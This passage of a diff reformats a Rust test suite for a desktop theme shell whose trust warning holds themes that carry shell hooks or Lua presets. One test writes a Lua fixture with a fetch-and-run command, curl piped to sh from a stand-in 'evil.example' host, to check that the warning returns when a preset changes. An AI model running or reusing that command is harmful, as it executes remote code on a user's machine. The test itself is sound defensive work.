             (got != Some(want)).then(|| format!("[{lang}] want {want:?}, map has {got:?}"))
         })
         .collect();
-    assert!(wrong.is_empty(), "the i18n maps do not carry today's System copy: {wrong:#?}");
+    assert!(
+        wrong.is_empty(),
+        "the i18n maps do not carry today's System copy: {wrong:#?}"
+    );
 }
 
 /// No Spanish label may be a copy of its English one: that is what a MISSING
@@ -18682,8 +19834,8 @@ fn main_applies_the_system_i18n() {
 /// Spanish lives in `i18n/es.json`, which the map test above pins.
 #[test]
 fn system_section_and_activation_card_read_their_text_from_system_text() {
-    let ss =
-        std::fs::read_to_string("ui/panel/sections/SystemSection.slint").expect("SystemSection.slint");
+    let ss = std::fs::read_to_string("ui/panel/sections/SystemSection.slint")
+        .expect("SystemSection.slint");
     for gone in [
         "text: \"System\";",
         "Activation, settings and About. Tiling stays as-is.",
@@ -18710,7 +19862,10 @@ fn system_section_and_activation_card_read_their_text_from_system_text() {
         "about-title: SystemText.about-title;",
         "docs-label: SystemText.docs-label;",
     ] {
-        assert!(ss.contains(live), "SystemSection must read {live} — missing");
+        assert!(
+            ss.contains(live),
+            "SystemSection must read {live} — missing"
+        );
     }
     let comp = std::fs::read_to_string("ui/components.slint").expect("components.slint");
     for live in [
@@ -18718,7 +19873,10 @@ fn system_section_and_activation_card_read_their_text_from_system_text() {
         "active-text: SystemText.activation-desc-active;",
         "inactive-text: SystemText.activation-desc-inactive;",
     ] {
-        assert!(comp.contains(live), "ActivationCard must default to {live} — missing");
+        assert!(
+            comp.contains(live),
+            "ActivationCard must default to {live} — missing"
+        );
     }
 }
 
@@ -18923,7 +20081,10 @@ fn motion_section_reads_its_chrome_from_motion_text() {
         "rename-text: MotionText.card-rename;",
         "delete-text: MotionText.card-delete;",
     ] {
-        assert!(ms.contains(live), "MotionSection must read {live} — missing");
+        assert!(
+            ms.contains(live),
+            "MotionSection must read {live} — missing"
+        );
     }
 }
 
@@ -19058,7 +20219,8 @@ fn sync_applied_theme_converges_both_surfaces_and_keeps_bakes() {
     // Headless window: gallery cards carry stale bakes and mark nothing.
     let win = crate::MainWindow::new().unwrap();
     fn baked_row(name: &str) -> crate::GalleryCardData {
-        let img = slint::Image::from_rgba8(slint::SharedPixelBuffer::<slint::Rgba8Pixel>::new(4, 4));
+        let img =
+            slint::Image::from_rgba8(slint::SharedPixelBuffer::<slint::Rgba8Pixel>::new(4, 4));
         crate::GalleryCardData {
             name: SharedString::from(name),
             saved_at: SharedString::from(""),
@@ -19134,7 +20296,12 @@ fn sync_applied_theme_converges_both_surfaces_and_keeps_bakes() {
     for i in 0..cards.row_count() {
         let row = cards.row_data(i).unwrap();
         let is_beta = row.name.as_str() == "Beta";
-        assert_eq!(row.is_active, is_beta, "card {} active flag", row.name.as_str());
+        assert_eq!(
+            row.is_active,
+            is_beta,
+            "card {} active flag",
+            row.name.as_str()
+        );
         assert!(
             row.thumb.size().width > 0
                 && row.hero.size().width > 0
@@ -19316,7 +20483,10 @@ fn theme_trust_warning_gates_both_apply_paths_until_the_keeper_confirms() {
         &["Risky".to_string()],
         "confirming must apply exactly the held theme, once"
     );
-    assert!(!win.get_trust_warning_open(), "confirming must close the warning");
+    assert!(
+        !win.get_trust_warning_open(),
+        "confirming must close the warning"
+    );
     assert_eq!(win.get_panel_save_dialog_mode(), "");
 
     // W2c: that confirmation was REMEMBERED for exactly this content, so the
@@ -19354,7 +20524,10 @@ fn theme_trust_warning_gates_both_apply_paths_until_the_keeper_confirms() {
         "changed content must bring the warning back"
     );
     win.invoke_trust_warning_cancelled();
-    assert!(!win.get_trust_warning_open(), "Cancel must close the warning");
+    assert!(
+        !win.get_trust_warning_open(),
+        "Cancel must close the warning"
+    );
     assert_eq!(
         gallery_applied.borrow().len(),
         2,
@@ -19394,10 +20567,17 @@ fn theme_trust_warning_gates_both_apply_paths_until_the_keeper_confirms() {
     win.invoke_gallery_card_clicked(1);
     assert_eq!(
         &*gallery_applied.borrow(),
-        &["Risky".to_string(), "Risky".to_string(), "Plain".to_string()],
+        &[
+            "Risky".to_string(),
+            "Risky".to_string(),
+            "Plain".to_string()
+        ],
         "a clean theme must apply exactly as before"
     );
-    assert!(!win.get_trust_warning_open(), "a clean theme shows no warning");
+    assert!(
+        !win.get_trust_warning_open(),
+        "a clean theme shows no warning"
+    );
     win.invoke_panel_apply_saved_theme(1);
     assert_eq!(
         &*panel_applied.borrow(),
@@ -19429,7 +20609,11 @@ fn theme_trust_reasks_for_a_package_it_could_not_inspect() {
     std::fs::create_dir_all(&provider).unwrap();
     // A settings.toml no TOML parser reads: the detector reports the
     // conservative "the hooks table could not be read" entry instead.
-    std::fs::write(provider.join("settings.toml"), "[hooks\nstarted = \"evil\"\n").unwrap();
+    std::fs::write(
+        provider.join("settings.toml"),
+        "[hooks\nstarted = \"evil\"\n",
+    )
+    .unwrap();
 
     let applied = std::rc::Rc::new(std::cell::RefCell::new(0usize));
     {
@@ -19453,7 +20637,11 @@ fn theme_trust_reasks_for_a_package_it_could_not_inspect() {
     }
 
     win.invoke_gallery_card_clicked(0);
-    assert_eq!(*applied.borrow(), 0, "a package nobody inspected must be held too");
+    assert_eq!(
+        *applied.borrow(),
+        0,
+        "a package nobody inspected must be held too"
+    );
     assert!(win.get_trust_warning_open());
     assert!(
         !win.get_trust_warning_remembered(),
@@ -19462,7 +20650,11 @@ fn theme_trust_reasks_for_a_package_it_could_not_inspect() {
 
     // Confirming applies it — and records NOTHING.
     win.invoke_trust_warning_confirmed();
-    assert_eq!(*applied.borrow(), 1, "confirming must apply exactly the held theme");
+    assert_eq!(
+        *applied.borrow(),
+        1,
+        "confirming must apply exactly the held theme"
+    );
     assert!(
         !store_path.exists(),
         "an uninspected package must leave no record at all"
@@ -19471,7 +20663,10 @@ fn theme_trust_reasks_for_a_package_it_could_not_inspect() {
     // The next attempt asks again: that is the whole point of not recording it.
     win.invoke_gallery_card_clicked(0);
     assert_eq!(*applied.borrow(), 1, "the second attempt must be held too");
-    assert!(win.get_trust_warning_open(), "the warning is owed every time");
+    assert!(
+        win.get_trust_warning_open(),
+        "the warning is owed every time"
+    );
     win.invoke_trust_warning_cancelled();
     assert!(!win.get_trust_warning_open());
     assert_eq!(*applied.borrow(), 1, "declining must change nothing");
@@ -19524,7 +20719,11 @@ fn theme_trust_notices_a_rewritten_preset_body() {
 
     // A preset is code too: the first attempt is held and warns.
     win.invoke_gallery_card_clicked(0);
-    assert_eq!(*applied.borrow(), 0, "a package carrying a preset must be held");
+    assert_eq!(
+        *applied.borrow(),
+        0,
+        "a package carrying a preset must be held"
+    );
     assert!(win.get_trust_warning_open());
     assert_eq!(
         win.get_trust_warning_presets().row_count(),
@@ -19537,7 +20736,11 @@ fn theme_trust_notices_a_rewritten_preset_body() {
 
     // The very same content applies in silence.
     win.invoke_gallery_card_clicked(0);
-    assert_eq!(*applied.borrow(), 2, "accepted content applies with no warning");
+    assert_eq!(
+        *applied.borrow(),
+        2,
+        "accepted content applies with no warning"
+    );
 
     // SAME name, SAME category, DIFFERENT payload.
     std::fs::write(&lua, "os.execute(\"curl -s evil.example | sh\")\n").unwrap();
@@ -19573,9 +20776,18 @@ fn theme_trust_warning_copy_states_the_honest_limit() {
         lower.contains("only continue if you trust where this theme came from"),
         "the copy must ask the keeper to judge where the theme came from"
     );
-    assert!(lower.contains("shell hook"), "the copy must name the shell hooks");
-    assert!(lower.contains("lua preset"), "the copy must name the Lua presets");
-    assert!(lower.contains("cancel") && lower.contains("continue"), "both decisions must be offered");
+    assert!(
+        lower.contains("shell hook"),
+        "the copy must name the shell hooks"
+    );
+    assert!(
+        lower.contains("lua preset"),
+        "the copy must name the Lua presets"
+    );
+    assert!(
+        lower.contains("cancel") && lower.contains("continue"),
+        "both decisions must be offered"
+    );
     // W2c: Continue is no longer a one-shot — the copy must SAY what it
     // remembers, in both states, because the two states differ.
     assert!(
@@ -19635,7 +20847,10 @@ fn theme_trust_gates_both_apply_paths_by_construction() {
         .split("window.on_gallery_card_clicked")
         .nth(1)
         .expect("main.rs must wire on_gallery_card_clicked");
-    let gallery = gallery.split("window.on_gallery_style_selected").next().unwrap_or(gallery);
+    let gallery = gallery
+        .split("window.on_gallery_style_selected")
+        .next()
+        .unwrap_or(gallery);
     let gallery = code_only(gallery);
     let gate_at = gallery
         .find("trust_gate_request")
@@ -19722,16 +20937,14 @@ fn theme_trust_warning_is_mounted_above_the_panel_and_escape_declines_it() {
 #[test]
 fn theme_trust_warning_renders_over_the_gallery_and_over_the_panel() {
     use slint::{ComponentHandle as _, ModelRc, SharedString, VecModel};
-    i_slint_core::platform::set_platform(Box::new(
-        i_slint_backend_testing::TestingBackend::new(
-            i_slint_backend_testing::TestingBackendOptions {
-                mock_time: true,
-                threading: false,
-                renderer_name: Some(slint::SharedString::from("software")),
-                ..Default::default()
-            },
-        ),
-    ))
+    i_slint_core::platform::set_platform(Box::new(i_slint_backend_testing::TestingBackend::new(
+        i_slint_backend_testing::TestingBackendOptions {
+            mock_time: true,
+            threading: false,
+            renderer_name: Some(slint::SharedString::from("software")),
+            ..Default::default()
+        },
+    )))
     .expect("platform already initialized");
 
     let win = crate::MainWindow::new().unwrap();
@@ -19772,16 +20985,17 @@ fn theme_trust_warning_renders_over_the_gallery_and_over_the_panel() {
         });
     }
     win.set_gallery_cards(ModelRc::new(VecModel::from(cards)));
-    let tiles: Vec<crate::SliceTileData> = crate::shell::gallery::views::slice::slice_delta_tiles(count, 1, 1920.0)
-        .into_iter()
-        .map(|t| crate::SliceTileData {
-            delta: t.delta,
-            real_index: t.real_index as i32,
-            is_expanded: t.is_expanded,
-            fade: t.fade,
-            dist: t.dist,
-        })
-        .collect();
+    let tiles: Vec<crate::SliceTileData> =
+        crate::shell::gallery::views::slice::slice_delta_tiles(count, 1, 1920.0)
+            .into_iter()
+            .map(|t| crate::SliceTileData {
+                delta: t.delta,
+                real_index: t.real_index as i32,
+                is_expanded: t.is_expanded,
+                fade: t.fade,
+                dist: t.dist,
+            })
+            .collect();
     win.set_gallery_slice_tiles(ModelRc::new(VecModel::from(tiles)));
     win.set_gallery_slice_delta_base(1);
     win.set_gallery_slice_focus_pos(1.0);
@@ -19805,9 +21019,9 @@ fn theme_trust_warning_renders_over_the_gallery_and_over_the_panel() {
         SharedString::from("started — sddm-watch.sh"),
         SharedString::from("colors_changed — notify-send palette changed"),
     ])));
-    win.set_trust_warning_presets(ModelRc::new(VecModel::from(vec![
-        SharedString::from("animations/Space.lua"),
-    ])));
+    win.set_trust_warning_presets(ModelRc::new(VecModel::from(vec![SharedString::from(
+        "animations/Space.lua",
+    )])));
 
     let settle = || {
         for _ in 0..3 {
@@ -19850,8 +21064,14 @@ fn theme_trust_warning_renders_over_the_gallery_and_over_the_panel() {
     );
     focus_press_key(&win, slint::platform::Key::RightArrow);
     settle();
-    let gate_continue = win.window().take_snapshot().expect("gallery, Continue focused");
-    save_slice_png(gate_continue.clone(), "trust_warning_gallery_continue_focused.png");
+    let gate_continue = win
+        .window()
+        .take_snapshot()
+        .expect("gallery, Continue focused");
+    save_slice_png(
+        gate_continue.clone(),
+        "trust_warning_gallery_continue_focused.png",
+    );
     let gate_cancel_ring_after = count_icy_in_region(&gate_continue, 1024, 1130, 796, 844);
     let gate_continue_ring_after = count_icy_in_region(&gate_continue, 1128, 1252, 796, 844);
     assert!(
@@ -19872,7 +21092,11 @@ fn theme_trust_warning_renders_over_the_gallery_and_over_the_panel() {
     // A package with a long carrier list must scroll inside the card,
     // never squash its rows or push the buttons out of the card.
     let many_hooks: Vec<SharedString> = (0..18)
-        .map(|i| SharedString::from(format!("event_{i} — /home/keeper/bin/hook-{i}.sh --with-arguments")))
+        .map(|i| {
+            SharedString::from(format!(
+                "event_{i} — /home/keeper/bin/hook-{i}.sh --with-arguments"
+            ))
+        })
         .collect();
     let many_presets: Vec<SharedString> = (0..24)
         .map(|i| SharedString::from(format!("animations/preset-{i:02}.lua")))
@@ -19882,7 +21106,10 @@ fn theme_trust_warning_renders_over_the_gallery_and_over_the_panel() {
     win.set_trust_warning_open(true);
     win.set_is_panel_open(false);
     settle();
-    let long_list = win.window().take_snapshot().expect("gallery, long carrier list");
+    let long_list = win
+        .window()
+        .take_snapshot()
+        .expect("gallery, long carrier list");
     save_slice_png(long_list.clone(), "trust_warning_gallery_many_carriers.png");
     assert!(
         count_buffer_diff(&gallery_open, &long_list) > 1000,
@@ -19982,16 +21209,14 @@ fn theme_trust_warning_scrolls_the_carrier_list_with_the_keyboard() {
     use slint::platform::Key;
     use slint::{ComponentHandle as _, ModelRc, SharedString, VecModel};
 
-    i_slint_core::platform::set_platform(Box::new(
-        i_slint_backend_testing::TestingBackend::new(
-            i_slint_backend_testing::TestingBackendOptions {
-                mock_time: true,
-                threading: false,
-                renderer_name: Some(slint::SharedString::from("software")),
-                ..Default::default()
-            },
-        ),
-    ))
+    i_slint_core::platform::set_platform(Box::new(i_slint_backend_testing::TestingBackend::new(
+        i_slint_backend_testing::TestingBackendOptions {
+            mock_time: true,
+            threading: false,
+            renderer_name: Some(slint::SharedString::from("software")),
+            ..Default::default()
+        },
+    )))
     .expect("platform already initialized");
 
     let win = crate::MainWindow::new().unwrap();
@@ -20155,8 +21380,8 @@ fn count_icy_in_region(
 /// the gate is open, no key may leak to the gallery behind the modal.
 #[test]
 fn theme_trust_warning_is_operable_from_the_keyboard() {
-    use slint::ComponentHandle as _;
     use slint::platform::Key;
+    use slint::ComponentHandle as _;
     use std::cell::RefCell;
     use std::rc::Rc;
 
@@ -20356,8 +21581,8 @@ fn theme_trust_warning_keeps_the_gallery_keys_inert_while_it_is_open() {
 /// answered with the mouse. The gate owns the keyboard until it closes.
 #[test]
 fn theme_trust_warning_keeps_the_keyboard_when_the_shell_reseeds() {
-    use slint::ComponentHandle as _;
     use slint::platform::Key;
+    use slint::ComponentHandle as _;
     use std::cell::RefCell;
     use std::rc::Rc;
 
@@ -20440,8 +21665,8 @@ fn theme_trust_warning_keeps_the_keyboard_when_the_shell_reseeds() {
 /// the way the shell reseeds did before this unit.
 #[test]
 fn theme_trust_warning_keeps_the_keyboard_when_a_layer_takes_it_for_itself() {
-    use slint::ComponentHandle as _;
     use slint::platform::Key;
+    use slint::ComponentHandle as _;
     use std::cell::RefCell;
     use std::rc::Rc;
 
@@ -20534,7 +21759,13 @@ fn theme_trust_warning_returns_the_keyboard_when_it_closes() {
             i_slint_backend_testing::mock_elapsed_time(std::time::Duration::from_millis(16));
         }
     };
-    let count = |needle: &str| traces.borrow().iter().filter(|t| t.contains(needle)).count();
+    let count = |needle: &str| {
+        traces
+            .borrow()
+            .iter()
+            .filter(|t| t.contains(needle))
+            .count()
+    };
 
     // ── Panel path: the gate takes the keyboard FROM panel-kbd and gives it back ──
     let losses = count("panel-kbd lost");
@@ -20687,7 +21918,10 @@ fn trust_warning_keyboard_wiring_is_pinned_by_construction() {
     // inside `if` blocks are not addressable), so the shell BINDS the flag
     // into both and each layer hands the keyboard back itself.
     assert!(
-        shell.matches("trust-gate-open: root.trust-warning-open;").count() == 2,
+        shell
+            .matches("trust-gate-open: root.trust-warning-open;")
+            .count()
+            == 2,
         "the gate flag must be bound into BOTH conditional layers (gallery + panel)"
     );
     // W2b residual 2: EVERY reseed observer must stand down while the gate is
@@ -20785,9 +22019,7 @@ fn trust_warning_keyboard_wiring_is_pinned_by_construction() {
             } else if window.contains("!root.trust-gate-open") {
                 gated += 1;
             } else {
-                panic!(
-                    "{name} takes the keyboard without standing down for the open gate: {line}"
-                );
+                panic!("{name} takes the keyboard without standing down for the open gate: {line}");
             }
         }
         assert_eq!(
@@ -20797,4 +22029,3 @@ fn trust_warning_keyboard_wiring_is_pinned_by_construction() {
         assert_eq!(handbacks, 1, "{name} must keep exactly one gate handback");
     }
 }
-
